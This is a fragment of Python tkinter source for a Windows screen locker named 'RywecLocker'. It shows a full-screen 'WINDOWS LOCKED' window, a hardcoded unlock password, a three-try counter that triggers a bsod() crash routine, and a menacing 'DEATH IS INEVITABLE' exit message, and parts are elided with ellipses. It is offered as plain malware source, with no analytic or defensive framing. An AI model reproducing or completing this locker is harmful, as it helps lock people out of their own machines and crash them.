...
password = "prime.net"
lock_text = "windows blocked.Rywec ReaperxyzOnTop"
count = 3
...
def check():
	...
	if enter_pass.get() == password:
		messagebox.showinfo("RywecLocker","UNLOCKED SUCCESSFULLY")

		uninstall(wind)
	else:
		count -= 1
		if count == 0:
			messagebox.showwarning("RywecLocker","number of attempts expired")
			bsod()
		else:
			
			messagebox.showwarning("RywecLocker","Wrong password. Avalible tries: "+ str(count))

def exiting():
   messagebox.showwarning("RywecLocker","DEATH IS INEVITABLE")
wind = Tk()
wind.title("RywecLocker")
wind["bg"] = "black"
UNTEXD = Label(wind,bg="black", fg="red",text="WINDOWS LOCKED BY RywecLocker\n\n\n", font="helvetica 75").pack()
